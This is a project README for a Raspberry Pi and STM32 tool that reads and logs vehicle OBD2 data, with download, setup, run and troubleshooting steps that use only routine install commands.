# 🚗 obd2_development - Simplifying OBD Reading with Ease

[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/yahyaadev/obd2_development/releases)

## 📜 Description
This project allows users to read OBD data using a Raspberry Pi and STM32 setup. It streams information in a simple format that non-technical users can easily understand. The goal is to create a simple and effective tool for monitoring vehicle data.

## 📋 Topics
- OBD2
- Bluetooth Low Energy (BLE)
- Raspberry Pi
- STM32
- PlatformIO
- Python
- Data Logging

## 🚀 Getting Started
To begin using this software, follow these steps:

### 1. Check System Requirements
Ensure your system meets these basic requirements:
- A Raspberry Pi (preferably any model that runs Linux)
- An STM32 NUCLEO-F446RE development board
- Internet access for downloading the software

### 2. Visit the Download Page
To download the software, [visit this page to download](https://github.com/yahyaadev/obd2_development/releases). 

### 3. Choose Your Version
You will see a list of available versions. Click on the most recent version that suits your needs. 

## 📥 Download & Install
1. After selecting the version, look for the asset that corresponds to your platform. Typically, this will be a `.zip` or `.tar.gz` file.
2. Click on the file to start the download.
3. Once downloaded, locate the file on your computer and extract it.

**Note:** If you need instructions on how to extract files, please refer to the guide specific to your operating system (Windows, macOS, or Linux).

## ⚙️ Setup Instructions
Once you have extracted the files, follow these steps to set up your application:

### 1. Install Necessary Software
You need to have the following software installed on your Raspberry Pi:
- **Python 3**: This project relies on Python for running the scripts. Install it using the package manager with the command:
  ```bash
  sudo apt-get install python3
  ```

- **PlatformIO**: This tool provides easy management for embedded development. You can install it via Visual Studio Code or as a standalone tool.

### 2. Configure Connection
1. Connect your STM32 board to your Raspberry Pi using a USB cable.
2. Open a terminal on your Raspberry Pi.
3. Navigate to the directory where you extracted the files:
   ```bash
   cd path/to/extracted/files
   ```

### 3. Run the Application
Start the application by executing:
```bash
python3 main.py
```
This will start the program and you will see output in the terminal. The program will establish a connection with the STM32 board and begin reading data.

## 🛠️ Features
- **Real-time Data Streaming**: View data as it is collected from your vehicle.
- **Easy Setup**: Simple installation process allows anyone to get started quickly.
- **Logging Capabilities**: The tool logs data for later review, making it easy to monitor performance.

## 🌟 Troubleshooting
If you encounter issues during setup or use, consider the following tips:

- **Connection Issues**: Ensure that your STM32 board is properly connected and powered.
- **Library Errors**: Make sure all necessary libraries are installed. Use the following command:
  ```bash
  pip3 install -r requirements.txt
  ```
  
- **Permission Errors**: If you face permission issues, consider running commands with `sudo`.

## 📞 Support
For additional help, please feel free to reach out through the GitHub Issues page. Community members and maintainers are available to assist you.

## 🔗 Next Steps
After getting the basic setup running, you may want to explore more advanced features:
- Adding a Bluetooth Low Energy (BLE) bridge for wireless communication.
- Developing a simulated CAN setup to test multiple nodes.

By following these instructions, you can successfully download, install, and run the obd2_development application on your Raspberry Pi. For consistent updates, always check back on the [release page](https://github.com/yahyaadev/obd2_development/releases).